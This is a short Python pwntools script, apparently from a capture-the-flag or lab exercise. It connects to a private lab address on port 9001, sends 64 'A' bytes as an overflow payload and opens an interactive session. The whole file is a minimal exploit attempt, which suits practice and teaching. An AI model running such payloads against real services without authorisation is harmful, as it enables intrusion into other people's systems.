from pwn import *


r = remote("10.10.33.204", 9001)
payload = b'A'*64
r.sendline(payload)
r.interactive()